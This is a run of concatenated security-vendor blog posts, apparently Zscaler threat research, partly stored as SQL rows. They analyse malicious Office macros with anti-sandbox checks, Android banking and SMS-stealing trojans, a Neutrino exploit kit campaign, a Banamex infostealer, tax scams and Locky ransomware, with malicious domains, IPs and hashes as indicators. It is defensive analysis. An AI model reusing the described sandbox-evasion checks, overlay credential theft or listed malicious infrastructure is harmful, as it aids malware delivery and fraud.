environment & automated analysis systems\r\n\r\n\r\n\r\nFigure 4: WMI interface to detect virtual environment & sandboxes\r\n\r\nCheck #3 - Look for presence of known analysis tools on the system\r\n \r\n\r\n\r\n\r\nFigure 5: Check for malware analysis tools\r\n\r\nIf any of these anti-VM or anti-sandbox checks is positive then the VBA macro code execution terminates and the end malware payload does not get downloaded on the system shielding it from automated analysis and detection. Alternately, the malicious document will download and install a malware executable on the victim\'s system if all the anti-VM checks fail.\r\n\r\nWe have seen multiple malware families leveraging malicious documents as the initial delivery vector:\r\n\r\n\r\n	Ransomware Trojans (e.g. CryptoWall, Locky, Cerber)\r\n	Banking Trojans (e.g. Dridex)\r\n	Backdoor Trojans (e.g. Matsnu, Kasidet)\r\n	Infostealer Trojans (e.g. Fareit, VawTrak, Pony)\r\n\r\n\r\nNew anti-VM and anti-sandbox checks\r\n\r\nIn the last week of May, we started seeing a new wave of malicious documents leveraging two new techniques that prevents it from executing on many known sandbox solutions.\r\n\r\nNew Check #1 - Detect virtual environment via Office RecentFiles property\r\n\r\n\r\n\r\nFigure 6: Microsoft Office RecentFiles property check\r\n\r\nRecentFiles property returns a RecentFiles collection that represents the most recently accessed files. The macro code checks if the number of RecentFiles collection is less than a predefined threshold and terminates if true. Threshold value we have seen is 3 or higher.\r\n\r\nThe malware author makes an assumption here that most clean Virtual Environment snapshots will be taken after a fresh Microsoft Office install with probably one or two document files opened for testing the installation. Alternately, a standard user system with Office applications should have at least 3 or more recently accessed document files.\r\n\r\nNew Check #2 - Check for the external IP ownership\r\n\r\n\r\n\r\nFigure 7: Check for security vendors, cloud & hosting services\r\n\r\nHere the malware author is leveraging macro to get the external IP address of the victim\'s system by using the following maxmind GeoIP service API:\r\n\r\nhttps://www.maxmind.com/geoip/v2.1/city/me\r\n\r\nThis API asks for user credentials but we did not see any hardcoded credential information being sent by the malicious document.

INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (101, 'Android Banker malware goes social', 'Shivang Desai', 'May 30, 2016', 'During a regular hunt for malware, our researchers came across an interesting malicious Android app that portrayed itself as an online app for the reputable Russian bank Sberbank, which is the largest bank in Russia and Eastern Europe.    There have been various attempts made in past to attack Sberbank of Russia and due to the ubiquitous nature of mobile devices, malware developers have also tried targeting Sberbank customers on their mobile devices in past. Looking at the sample we recently saw from our malware feeds, it appears to be yet another attempt at targeting the bank users in a unique way.    Overview:     The malware disguise itself as an online banking app for Russia\'s largest bank, Sberbank. The malicious app\'s appearance was similar to that of the original app. It displays a similar login screen to the original app and steals user credentials as soon as the victim tries to authenticate. Once the credentials are acquired, the app presents the victim with a page stating technical fault and terminates. The malware asks for administrator privileges upon installation, which if permitted, can cause devastating effects to the victim\'s device.    It can also intercept SMS messages and incoming calls which could be a step to overcome OTP (One Time Password) solutions implemented by the bank. Additionaly, this malware also contains modules to target a few other reputed apps for credentials.    Technical Explanation:    The app portrays itself as Sberbank\'s online Android app and upon installation, asks for administrator rights, as can be seen in screenshot below:           	  		  			  			  			  		  		  			  			Fake app and it\'s permissions  			  		  	           Once activated, it displays a login screen similar to the original app and can easily lure victims to enter their bank credentials.    We tried to install the original Sberbank online Android app from Google\'s Play Store, but it was hard to identify the difference between the original and fake app. Please note that Sberbank online app found from Google\'s Play Store is not malicious. Screenshot below displays both apps on phone:           	  		  			  			  			  		  		  			  			Original vs Fake bank app  			  		  	           One of the unique features of this malware is to overlay itself on the original Sberbank online app.  Even if the victim tries to access the original app, the malware will forcefully present its own fake login screen to the victim. Once the user enters their login details, they are sent to Command & Control (C&C) server. Credentials being sent to C&C can be seen in screenshot below:         	  		  			  			  			  		  		  			  			Credentials sent to C&C  			  		  	           As soon as the malware\'s purpose of stealing credentials is fulfilled, it displays a screen apologizing for some technical fault and closes itself. The error screen looks like shown below:           	  		  			  			  			  		  		  			  			Error Page after login  			  		  	           But the malware does not stop here. It also registers a few services and broadcast receivers, which were designed to remain persistent.  Following are the main functionalities exhibited by this malware:      	Sending SMS messages,  	Intercepting SMS messages  	Calling functionality  	Call interception  	Targeting other reputed apps via overlay screens           Sending SMS messages:    The malware is designed to accept commands from the C&C server allowing the malware developer to send SMS messages from the infected device to any number. Following screenshot shows how the functionality is implemented:           	  		  			  			  			  		  		  			  			Sending SMS functionality  			  		  	           In the above code snippet, \'paramString1\' and \'paramString2\' were the phone number and text message sent by C&C server, respectively. The attacker has the power to send any message to any number.    SMS message interception:    The malware intercepted SMS messages, collected the SMS details in a file and starts an Android service responsible for sending the file to remote C&C server.    Following screenshot shows the logic implemented for this functionality:         	  		  			  			  			  		  		  			  			SMS interception code snippet  			  		  	           We also noticed that the C&C server responded with locations where the interecepted SMS details should be sent. Malware was designed to work over Android\'s webview component allowing it to extract JavaScript from the C&C server\'s response and act accordingly.      Screenshot below shows the location received from C&C server:      	  		  			  			  			  		  		  			  			Location for sending SMS details  			  		  	           Screenshot below shows the SMS details sent to remote C&C server.      	  		  			  			  			  		  		  			  			SMS details in HTTP request  			  		  	           Calling functionality:    This malware is also capable of calling any number that the attacker wanted. This could cost the victim depending on the number of calls and the type of calls (premium numbers, international, etc) made by the malicious app.  The functionality was embedded in the class named \"MeSystem.\" This class was responsible for extracting numbers from C&C server\'s response and to make calls to those numbers. In the screenshot below, \'str\' is the string that was received from C&C.         	  		  			  			  			  		  		  			  			Call functionality  			  		  	           Call interception:    The malicious app also implemented call interception functionality. Currently, we found that it was only collecting the information about incoming call phone numbers and the duration of the call. It was not recording calls.  Screenshot below was taken when the device received a call and malware sent over the details to C&C server.         	  		  			  			  			  		  		  			  			Call details in HTTP request  			  		  	           Overlay Functionality:    In addition to the Sberbank app, this malware was also designed to target these three apps:  -Whatsapp.  -Google Play Store app.  -VTB 24 Banking app.    The list of targeted apps was sent by the remote C&C server and is stored locally by the app as shown below:         	  		  			  			  			  		  		  			  			URLs for fake login screens  			  		  	           \"name\" field justifies the package names of the app, such that whenever any app from the above mentioned list is opened, the malware detects it and overlays fake login screen according to the URL mentioned for respective package name.    The fake login pages fetched from those URLs have the same representation as the original ones. Once the user enters their credentials, they are sent to C&C server and the same functionality of displaying technical error is implemented.    Following screenshots show fake login page for VTB-24 online banking app and credentials being sent to C&C :           	  		  			  			  			  		  		  			  			Fake login for VT bank  			  		  	           It\'s a new trend for malware developers to target the victim with help of security features of the app. In the previous blog, we saw how attackers leveraged fake security app theme. In case of WhatsApp, malware developers have attempted to lure victims using a fake message for newly implemented encryption functionality.    When the original WhatsApp app was opened, the malware displays an overlay screen fetched from the respective URL supplied by C&C server. Initially it displayed a message stating that WhatsApp needs authentication and payment information for the newly implemented Encryption functionality.    As soon as victim proceeds, the malware asks for the required details and relays it to the C&C server.    Following screenshot shows this functionality:           	  		  			  			  			  		  		  			  			Fake WhatsApp   			  		  	           Persistence:    Apart from this, the malware has a very clever approach to remain persistent. It registers a broadcast receiver that triggers whenever the victim tries to remove administrator rights of the malware app, locking the android device for a few seconds. As a result, it is not possible to uninstall this malicious app by revoking admin rights. Screenshot below shows this functionality in action:         	  		  			  			  			  		  		  			  			Lock down functionality  			  		  	           The only option left with the victim is to reset the device to factory settings. This again will lead to more data loss for the victim.    Conclusion:    Targeting bank customers using fake banking apps is the easiest way and the most successful vector for attackers. This malware combines multiple malicious functionalities into a single app and takes full advantage of a successful infection. The attacker can control the list of legitimate apps to be targeted via C&C commands, causing the malware app to display an overlay screen supressing the legitimate app and steal sensitive user information.    The certificate of this malicious app was recently updated and the C&C server domain was also recently registered. Zscaler\'s ThreatLabZ will continue to monitor future activities from this malware family and ensure adequate security coverage.', 'Mobile Malware', 'https://www.zscaler.com/blogs/research/android-banker-malware-goes-social');

But over the last month we have seen an increase in activity from Neutrino, with multiple campaigns using both compromised sites and advertising services. \r\n\r\n\r\n\r\nFigure 1: Neutrino hits over the last 30 days\r\n\r\nAlthough the majority of Neutrino activity in 2016 has been through compromised, otherwise legitimate sites, several new Neutrino malvertising campaigns have emerged. Like several campaigns observed in late 2015, the end payload from the exploit kit from these recent campaigns was Gamarue/Andromeda.  Multiple advertising networks were involved in serving the malicious pages, which served other advertising content as well as a Neutrino landing page.\r\n\r\nMalvertising campaign\r\n\r\nThe content served by the advertising networks consisted of two iframe injections. One served the advertising content, which typically pulled from casino-related game sites. The other requested PHP page from the same host, which would serve yet another iframe that pointed to one of several Neutrino landing page domains hosted on the same IP. After multiple requests to the intermediary page, the host would stop serving the iframe redirect and instead serve a blank page, making enumerating the associated landing pages challenging.\r\n\r\n\r\n\r\nFigure 2: Neutrino EK infection session\r\n\r\n\r\n\r\nFigure 3: iframe redirects from malicious site\r\n\r\nNeutrino EK landing pages are fairly unsophisticated, usually just an embedded Flash object as compared to Angler’s landing pages containing highly obfuscated JavaScript. The landing page observed in this campaign is identical to most other Neutrino landing pages we have seen recently; nothing more than an embedded Flash exploit, in line with common Neutrino resource naming convention. \r\n\r\n\r\n\r\nFigure 4: Neutrino EK Landing page\r\n\r\nThe landing page serves a malicious SWF in standard EK form. This exploits Flash Player and downloads, decrypts, and executes a packed Gamarue payload.\r\n\r\n\r\n\r\nFigure 5: Flash exploit payload\r\n\r\n\r\n\r\nFigure 6: Encrypted Malware payload\r\n\r\nGamarue\r\n\r\nGamarue/Andromeda is a modular trojan and a well-documented malware family that has seen many changes over the last several years. It is frequently used to download other second-stage payloads or toolkits, as well as extending its own functionality with modules downloaded after infection.\r\n\r\nThe sample attempted to contact a command and control server hosted on a domain with a similar naming scheme to the original malicious site. Other samples seen in the campaign contacted similar domains, hosted on different IPs. At one point, the botnet C2 was hosted on the same IP as the malicious domain. We observed Gamarue downloading additional modules from the callback domain.\r\n\r\nGamarue uses the machine volume serial number as part of its botnet registration. If multiple attempts were made to run a sample in a sandbox with the same volume serial number, the registration would fail and no further modules would be downloaded.\r\nThe Gamarue base uses several anti-analysis methods to avoid being run in a sandbox. However, the anti-analysis functionality can be bypassed by creating a registry key under “HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies” named “is_not_vm” with the value as the volume serial number as a 32-bit hexadecimal number.\r\n\r\n\r\n\r\nFigure 7: Gamarue callback traffic\r\n\r\n\r\n\r\nFigure 8: Gamarue modules\r\n\r\nGamarue/Andromeda is analyzed in depth at https://blog.avast.com/andromeda-under-the-microscope\r\n\r\nConclusion\r\n\r\nThis exploit chain is a typical example of recent malvertising activity using Neutrino EK. Using advertising services to deliver exploit kits allows the attacker to rapidly set up new malicious domains without having to compromise existing legitimate hosts. Gamarue is still a common payload for Neutrino and other exploit kits, as it is easily customizable to serve as a downloader for a second-stage infection or extended with other modules. To help avoid infections such as these, users should always block untrusted third-party scripts and resources. \r\n\r\nZscaler’s ThreatLabZ has confirmed coverage for the Neutrino EK redirect & landing page scripts and Gamarue payloads, ensuring protection for organizations using Zscaler’s Internet security platform.\r\n\r\nIOCs\r\n\r\nAdvertising hosts:\r\n\r\nwww.myadserver-hub.com\r\n\r\nwww.liveadexchanger.com\r\n\r\nwww.adnetworkperformance.com\r\n\r\nwww.brightadnetwork.com\r\n\r\nads.deltatv.site\r\n\r\nspeednetwork1.adk2x.com\r\n\r\nMalicious domain: kkkj[.]ru (195.211.153.40, 31.184.233.109)\r\n\r\nLanding page domains: \r\n\r\ngojjiraffe.top (108.61.221.86)\r\n\r\nfetsnake.top (94.177.249.150)\r\n\r\nkixmandrill.top (94.177.249.150)\r\n\r\nwaterof.top (94.177.249.150)\r\n\r\nhouruq.top (94.177.249.150)\r\n\r\nCallback domains:\r\n\r\nzggg[.]ru (95.213.192.70)\r\n\r\nzvvv[.]ru (95.213.192.70)\r\n\r\nznnn[.]ru (195.211.153.40, 31.184.233.109)\r\n\r\nSWF exploit: D834A9891C7438B13F4A0D34ED71C84A \r\n\r\nGamarue: A5EE3924786A8425A6C5BCFD8D6310FC', 'Compromise;Malware', 'https://www.zscaler.com/blogs/research/neutrino-malvertising-campaign-drops-gamarue');

In April, the new Infostealer family of Spanish origin was first noted targeting users in the U.S. and Mexico.\r\n\r\nThe malware authors are currently targeting users of Mexico\'s second largest bank, Banamex, but it is capable of updating the configuration file to include more financial institutions.\r\n\r\nDelivery Mechanism & Installation\r\nThe infection cycle starts with an installer payload that uses double extension \'curp.pdf.exe\' in a relatively poor attempt to pose as a PDF document to the end user. The malware payload does not have the PDF file icon embedded in it, so the user will see the document file with a generic application icon as seen below:\r\n\r\n                                                 \r\n\r\n                      Infostealer installer using double file extension\r\n\r\nSample URLs that we have seen serving installer payloads in last two weeks:\r\n\r\ncigm[.]co/js/slick/curp.pdf.exe\r\nsaysa[.]com.co/js/rfc.pdf.exe\r\nsaysa[.]com.co/js/curp.pdf.exe\r\nbestdentalimplants[.]co.in/js/curp.pdf.exe\r\ndenticenter[.]com.co/js/slick/curp.pdf.exe\r\n\r\n \r\n\r\nOnce executed, the installer will attempt to download the following three components on the victim\'s machine:\r\n\r\n\r\n	syswow.exe - This is the main Infostealer payload that steals the banking credentials\r\n\r\n\r\n\r\n	FiddlerCore3dot5.dll - Fiddler Proxy Engine for .NET applications. This is a legitimate .NET Class library file that the malware authors are using in the main Infostealer functionality \r\n\r\n\r\n\r\n	Newtonsoft.Json.dll - Open source JSON framework for .NET applications. This is a legitimate .NET Class library file that the malware authors are using for parsing Command & Control (C&C) server response data and converting it into XML format\r\n\r\n\r\nThe above files are downloaded in the windows system directory as seen in the code below:\r\n\r\n\r\n\r\n                                             Infostealer installer downloading components\r\n\r\nThe installer will then execute the main Infostealer payload and terminates itself.\r\n\r\nInfostealer Payload analysis\r\n\r\nThe Infostealer payload first checks for the presence of the FiddlerCore3dot5.dll and Newtonsoft.Json.dll on the victim\'s machine. If the DLL files are not found then the malware will attempt to download these files from a new location that is hard-coded in the payload. Once the DLLs are in place, the malware will check for the victim\'s operating system version as seen below:\r\n\r\n\r\n\r\n                                             Infostealer checking operating system version\r\n\r\nFor Windows XP (32-bit & 64-bit) and Windows Server 2003, the malware will create an autostart registry key entry to ensure persistence upon system reboot. Then, the malware downloads a configuration file and starts the Fiddler proxy engine.\r\n\r\nFor other versions of Windows, the malware will not create an autostart registry key. However, in order for the Fiddler proxy engine to work properly the malware will install a Fiddler generated root certificate before starting the proxy engine.\r\n\r\nC&C configuration file\r\n\r\nUpon successful installation, the Infostealer Trojan will collect information such as “MachineName”, “UserName”, “systeminfo” and “hostip” from the infected system and sends it to the remote C&C server in Base64 encoded format as seen below:\r\n\r\n\r\n\r\n                                    Infostealer sending machine information\r\n\r\nThe C&C server will respond back with a configuration file that contains a list of URLs pointing to alternate C&C locations as well as other instructions. The malware uses Json.NET library to parse the server response and save it in the XML format with file name registro.xml. Here is a sample configuration file that we saw during our analysis:\r\n\r\n\r\n\r\n                                 Infostealer XML configuration file\r\n\r\nThe configuration file also contains a list of Domain to IP tuples that are primarily used by the Infostealer Trojan to hijack user requests to those domains and redirecting them to a malicious server hosting fake phishing site for the targeted domain.\r\n\r\nThe malware initializes a timer component with an interval of 10 minutes that will trigger a RefreshInfo function call. This will result in a download of a new configuration file from the next URL in the list every 10 minutes.\r\n\r\nFiddler to intercept HTTP and HTTPS traffic\r\n\r\nIt is interesting to note that the malware leverages Fiddler proxy engine to intercept HTTP/HTTPS connections and redirecting the users to the attacker-controlled server hosting fake site.\r\n\r\nThe malware achieves this by adding x-overrideHost flag containing attacker\'s Server IP address, if the domain name is on the target list in the C&C configuration file. This will cause Fiddler proxy engine to resolve the domain to the supplied IP address sending the victim user to a fake website.\r\n\r\nScreenshot of fake Banamex page from an infected system:\r\n\r\n\r\n\r\n                       Fake Banamex site hosted on the attacker-controlled server\r\n\r\nConclusion\r\nWe regularly see multiple .NET based malware payloads but this particular Infostealer Trojan caught our attention because of the use of popular application libraries like Fiddler & Json.NET in its operation.\r\n\r\nMexico\'s second largest bank - Banamex, appears to be the main target of this Infostealer Trojan for credential theft and financial fraud. However, the authors can easily add more targets given that they are actively updating the list every 10 minutes.

This year, the IRS warned of a 400% increase in phishing attempts and tax related e-mail scams. While phishing can be leveraged to steal credentials and other information directly, malware attacks can give a foothold to surveil users and networks, and steal all kinds of confidential information.         A broad search of Tax related files indicates that there are a number of users actively downloading files that are related to filing their yearly income taxes. Scammers are counting on this subset of users to exploit.    In the next section, we will detail some attacks attempting to social engineer and infect the unwary tax-preparer.    Scams    TurboTax Ad/Bundleware    In addition to the e-mail based threats the IRS warned of (which we will detail below), we have found some fake downloads for commonly-used tax software such as TurboTax. These \"Download Manager\" packages rely on search engine poisoning combined with unwary users looking for a way to download tax software, even if it may not be completely legal.         Besides promising TurboTax, one of the fake \"installer\" packages we found also offers to install Norton and a free-to-play MMO called StormFall.        Since StormFall is web-based, the \"installation\" consists of placing a shortcut entry in the start menu that launches Chrome with the address of Stormfall (including the adware author\'s advertising ID, of course).         If the Norton option was selected, an icon for an app called Smart Wrapper appears in the taskbar. Opening this app from the taskbar shows the Smart Download status window, depicting the status of the Norton download.        In the end, this \"installer\" doesn\'t even install the TurboTax software that was the original lure. To add insult to injury, the user is shown two browser tabs, one of which is the official TurboTax purchase and download page.    Generating advertising revenue is the primary purpose of threats like these, however they still create a situation where an unknown actor with unknown intentions has achieved the ability to monitor the system, gather information, and make system changes including installing additional software packages.    Tax Report    Our first e-mail based case comes via a ZIP attachment from a scam e-mail aptly named ‘Tax Report.zip’. At the time of research, this threat was detected by 34/56 AV vendors on VirusTotal. The threat itself is a family of Trojan Droppers known as Bagsu. Its purpose is to download additional malware payloads and gain remote access to the PC to collect sensitive information. This sample appears to be no different as it delivered a payload from the Worm family Gamarue.    Gamarue is a Worm that copies itself to all removable devices and network drives connected to the victim’s system. Once installed, it begins beaconing to remote control servers with information about the user. It can download new malicious modules to the victim after infection or simply perform reconnaissance on the user’s system. At the time of research, this sample was already well covered with a score of 46/56 on VirusTotal.        The sample made other attempts to connect to malicious domains, but these were sinkholed at the time of research:    http://dudebox[.]pl/image.php    http://dyndin[.]ru/image.php    http://headart[.]pl/image.php    http://iprice[.]pl/image.php    http://linebench[.]ru/image.php    Tax \'Challan\'    Our second e-mail sample is part of a spam campaign that has been targeting Indian national taxpayers this year. In this campaign, emails are sent from spoofed Indian government domains, alerting the victim that a sum of money has been deducted from their bank account to cover owed taxes. The email instructs the victim to see the challan (receipt) for the transaction, which is a zip archive either attached to the email or hosted at a malicious domain. The archive, typically named some variant of “Tax Payment Challan.zip”, contains a malicious executable. Symantec reported on this campaign earlier this year. This threat remains active, and ThreatLabZ has seen incidents going back to November of 2015.    The malicious payload is an infostealer trojan that attempts to dump passwords from browsers installed on the victim’s machine. The threat is detected with a ratio of 41/57 on VirusTotal, but is mainly detected under generic threat names. The payload is a Visual Basic binary that installs itself in %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ for persistence. The binary also stores a UPX-packed, custom-compiled cURL binary as a resource.        The trojan extracts the resource and uses cURL to download additional payloads from a malicious domain. These tools are wrappers for various freely-available browser password dump software.        The trojan runs the password dump utilities, collects their output, and sends it via HTTP POST to a separate malicious domain.        Zscaler provides coverage for the trojan payload and its network communication.    The following domains are contacted by the infostealer:    laptopb4you[.]com (password dump utilities)    holytrinitycarehome[.]com (callback)    The initial payload has been observed downloaded from the following domains:    digitalcareer.co[.]in    balajiitilanji[.]com    Ijggpb[.]in    Conclusion    Zscaler protects its customers from these threats with multiple layers, but the best protection in this case is to be mindful and cautious. As the IRS Spokesperson Mark S. Green stated: “The IRS DOES NOT initiate contact with taxpayers by email, text, social media or electronic communications to request personal or financial information.\"    If you receive a suspicious email from the IRS, report it by sending it to phishing@irs.gov.         Authors: Edward Miles, Chris Mannon, Derek Gooley', 'Scam', 'https://www.zscaler.com/blogs/research/tax-season-scams');

Locky came into the limelight when it hit the Hollywood Hospital last month causing the hospital to pay Bitcoins worth $17,000 in ransom.  Locky is known to arrive via spam e-mails containing malicious attachments.    Zscaler has blocked over 75 unique & new payloads from this ransomware family, targeting our customers, in the last month as shown below:      	  		  			  		  		  			Locky ransomware unique payloads blocked  		  	      The Locky payload delivery mechanism    The initial wave of Locky ransomware spam involved malicious Microsoft Office documents containing VBA macro to download and execute binary payload on the victim machine. Locky authors have since switched to spamming a Zip archive containing malicious JavaScript to download and execute the Locky payload    A sample malicious document from a Locky spam campaign that contains VBA macro designed to download the Locky payload from a predetermined remote location can be seen below:      	  		  			  		  		  			Malicious Document  		  	      A second delivery mechanism involves a heavily obfuscated JavaScript files in a Zip attachment. These JavaScript payloads are highly obfuscated and leverages UTF-16 encoding to hide the download URL. The authors are also changing the obfuscated payload regularly in order to evade AV detection, a technique commonly used by Exploit Kit (EK) authors to protect the EK landing pages. A sample malicious JavaScript code delivering Locky ransomware can be seen below:      	  		  			  		  		  			Obfuscated JavaScript to deliver Locky  		  	      The JavaScript uses ActiveX objects to download Locky ransomware on victim\'s machine. The decoded JavaScript is shown below:      	  		  			  		  		  			Decoded JavaScript  		  	      Payload Analysis    We have seen a large uptick in the delivery of Locky payloads during the month of March 2016.      	  		  			  		  		  			Uptick in Locky payloads getting blocked  		  	      We looked at one of the newer Locky variant that was seen in the wild recently. The analyzed Locky payload is a 32-bit Microsoft Visual C++ compiled Windows executable packed using custom packer routine.    Upon execution, the malware first checks for the user & system default language preferences of the infected system and terminates itself if the language is Russian. Locky creates a copy of itself as \"%TEMP%/svchost.exe\" and an auto start registry key entry to ensure persistence upon system reboot. In order to mark a successful infection on the system, Locky creates the following registry keys with value name \"pubkey\" and \"paytext\" as seen below:      	  		  			  		  		  			Locky registry key  		  		  			  			\"pubkey\" is used to store the RSA key used for encryption    			\"paytext\" is used to store the payment related information  			  		  	      Upon successful infection, Locky will encrypt the following file types on the victim machine:      	  		  			  		  		  			File types encrypted  		  	      These encrypted files are renamed to unique ID generated for the victim\'s machine followed by unique file ID and a \".locky\" extension. The ransom note is displayed in a bitmap image that is also set as a wallpaper for the infected user\'s desktop as seen below:      	  		  			  		  		  			Ransom note  		  	      As seen in case of other crypto ransomware families, victim\'s files are held as hostage for a ransom. The ransom payment instructions for receiving the private RSA key required to decrypt the user files is readily available through the URLs mentioned in the ransom note.      	  		  			  		  		  			Payment instructions  		  	        Command & Control communication      The Locky payload contains a list of hardcoded Command & Control (C&C) server IP addresses that appear in plain text in the unpacked binary as seen below:      	  		  			  		  		  			Hardcoded C&C IPs  		  	      In addition, Locky ransomware also leverages a custom Domain Generation Algorithm (DGA) for hiding its C&C server location. The DGA algorithm used for generating possible C&C domains in the payload that we analyzed can be seen below:      	  		  			  		  		  			Domain Generation Algorithm  		  	      Locky communicates with the C&C server using custom encryption and the following HTTP request format:    POST  http:// [hardcoded IP  or DGA domain]/main.php      	  		  			  		  		  			Sample encrypted C&C communication  		  	        The initial C&C communication typically consists of three HTTP POST requests.    Request #1: Register the infected system\'s unique ID and request RSA key to be used for encrypting user files. The figure below shows the content of this POST request in plain text:      	  		  			  			  			  		  		  			C&C request #1  		  	      The server responds back with a RSA key that is used by Locky to encrypt all the user\'s files on the victim machine.    Request #2: Request the content of ransom note to be displayed on the infected system asking for payment. Below is the content of this POST request as well as the response from the C&C server in decoded form:      	  		  			  		  		  			C&C request #2 & response  		  	      Request #3: The final request sends the statistics about successfully encrypted files as seen below:      	  		  			  		  		  			C&C request #3  		  	      Conclusion    Locky is the latest addition to Ransomware, one of the most active & lucrative malware strains seen in past three years. This new ransomware family follows the same model of using asymmetric (public key) encryption to lock user documents and demand ransom for the decryption key.  The delivery vector has been primarily spammed e-mail attachments that are responsible for downloading the Locky payload. We also noticed an interesting overlap in the recent campaigns where same URLs were being used to deliver both Dridex & Locky payloads.    Zscaler’s ThreatLabZ has confirmed coverage for the initial downloader and Locky payloads, ensuring protection for organizations using Zscaler’s Internet security platform.

Noting that 1 in 5 mobile searches are related to porn, it’s no surprise that hackers continue to create fake porn apps to disguise malware. Our researchers analyzed another similar adult themed malware in November last year.      App Name: 岛国速播  URL: hxxp://bhltzgs[.]com:81/sebo363[.]apk  MD5: f71f8db8994699299b0bcda31d951c41  Package Name: ugo.jkh.efp  VirusTotal Detection: 15/55    Overview:    The application in question is presented as a porn player. When the user clicks on the application icon, he or she will be presented with thumbnails to many porn videos. When the user tries to play one of these videos, the application will download 3 files in the background and a shortcut will be placed on the main page of the device. The application also requests on-demand videos via SMS - costing the user money without them knowing. The 3 dropped files are also depicted as porn players. When the user clicks on videos shown in these applications, they again drop more files to the device - resulting in a never-ending process. Some of these dropped files have icons that look similar to the Internet Explorer and Angry Birds applications for the sole purpose of scamming the user. However, these dropped applications are actually SMS stealers or fake installers.    Details:    When you try to install the application, it asks for the following permissions:       	  		  			  		  		  			Permissions  		  	        Upon launching the application, you will be able to see a list of obscene videos. When you click on any of those videos, instead of playing them the malware drops 3 additional porn applications on the device.      	  		  			  		  		  			Different Levels  		  	      Technical Analysis:    When the user tries to play a video from the application, a JAR file is downloaded from the link hxxp://link[.]kssgx[.]com/cj[.]jar. This URL is stored in the application in the following fashion:      	  		  			  		  		  			cj.jar URL formation  		  	      Subsequently it fetches another URL from the downloaded cj.jar, which is then used to drop multiple malicious apps to the user\'s device. The link for downloading the dropper files are stored in an xml file, the link to which is present in cj.jar      	  		  			  		  		  			URL for XML file  		  	      This xml file contains the URL for downloading the dropper files.      	  		  			  		  		  			XML file contents  		  	      All the downloaded files have been flagged malicious by multiple AV vendors. Here are links to 3 malicious APK files dropped on the device by the main application:        	  	hxxp://sfgg[.]gpdzj[.]com/download/20160302/mmys1069[.]apk   	  	  	hxxp://www0127[.]007wr[.]com/a[.]php?aid=1313 - Qvodplayer1001.apk  	  	  	hxxp://csu[.]hsouying[.]com/IJjyMj - this gets redirected to hxxp://appcdn[.]hsouying[.]com/video/appstore1/destapk/1457085498605/avplay02039[.]apk  	        These files also take the form of porn players, but are actually SMS stealers. When the user tries to launch one of these applications, it again results in dropping of more files into the device, which continues a never-ending chain. Two of the dropped applications have icons similar to Internet Explorer in order to scam the users into using the application.      	  		  			  		  		  			Downloaded Applications  		  	      This application downloads yet another file from the link hxxp://cdn2[.]upay360[.]cn/pack[.]dat. This is a jar file, which shows some really shady behavior. This jar file uses 3 broadcast receivers:      	  	SMSReceiver   	  	  	SendBroadcastReceiver  	  	  	DeliverBroadcastReceiver  	      The application uses the concept of pending intents, which allows another application to use your application\'s permissions to execute a predefined piece of code.    SMSReceiver is triggered whenever an SMS is received. Its functionality is to fetch the details of each new SMS. It checks whether the SMS has been sent from China and if so, will abort the notification so that the user has no knowledge of the new SMS.      	  		  			  		  		  			SMS Receiver  		  	      The application also scams the user with premium on-demand videos, which are requested via SMS without the knowledge of users. This application leverages the commonly known 1npay to scam the victims. The application sends out a POST request, in which the method of payment is specified via SMS.      	  		  			  		  		  			POST request for SMS  		  	      SendBroadcastReceiver listens to the order SMS being sent to the number 106566660020, which is hardcoded in the application. On sending the order message, the user will receive a verify code via SMS. SMSReceiver aborts the broadcast of this message so no notifications are shown for the delivery of the new message to the end user.    DeliverBroadcastReceiver retrieves the verify code from the message and sends it in order to verify the order. This whole process causes the user to lose money.    The application also sends device related information. Below is the POST request sent by the application that was captured during our analysis:        	  		  			  		  		  			Device Details in post request  		  	      Removal:        Since the malware does not ask for Administrator privileges, removing it is not a difficult task.  The victim can traverse to Settings option in the Android device.      	Settings --> Apps  	Find the app in the list and click on it  	Then, click on Uninstall option  	Click Ok      We urge users to not trust any unknown links received via messages or emails. Additionally, disable the option of \"Unknown Sources\" under Settings of your device. This will not allow installation of apps from unknown sources.         Conclusion:        The application divides the overall functionality between the various dropped files. This can be a mechanism to evade detection by AVs. If one of the applications is detected by AV, the other applications can continue with their work. It is also interesting to note that each of these dropped applications try to target different sim operators in China.    There has been an increasing tendency of malware in disguise of adult rated applications in order to attract victims. The best way to avoid such applications is to stick to official app stores like Google Play and the Amazon app store.    ---      Research Blog by - Lakshmi Devi & Shivang Desai', 'Mobile Malware', 'https://www.zscaler.com/blogs/research/adult-themed-android-sms-stealer-trojan');

In subsequent years, Marcher variants also started targeting banking applications by presenting fake login pages to steal user credentials.    Marcher has continued to stay active and was recently covered by phishlabs. In this blog, we will cover a new wave of Marcher Trojan that is active since past one month where the malware arrives as an adobe flash installer package. We have captured over 50 unique payloads from this campaign. Majority of these Marcher payloads are from pornographic sites serving fake adobe flash player for watching porn. The primary goal of this malware is still the same - display a fake Google Play store payment page and steal financial information from the user.    Technical analysis  The infection cycle starts with the mobile user receiving a malicious URL via e-mail or SMS. Once the user opens this URL, the site will prompt the user to download and install the Adobe Flash Player update as seen below:      	  		  			  		  		  			Fake Adobe Flash Player outdated warning  		  	    The file that gets downloaded as a result of this action is aptly named - AdobeFlashPlayer.apk. Upon installation, malware asks for administrative access in order to perform its functions as seen below:      	  		  			  		  		  			Requests administrative access  		  	    Once installed, Marcher connects to a predetermined Command & Control (C&C) server and sends information about all the installed applications on the infected device as seen here:      	  		  			  		  		  			Relaying installed package information to C&C  		  	    During our analysis, we also observed a unique approach where the C&C server will send a response generating a MMS notification on the infected device saying \"You have received MMS\" and instructs the user to visit \"mms-service[.]info/mms\" to see the content of the MMS.

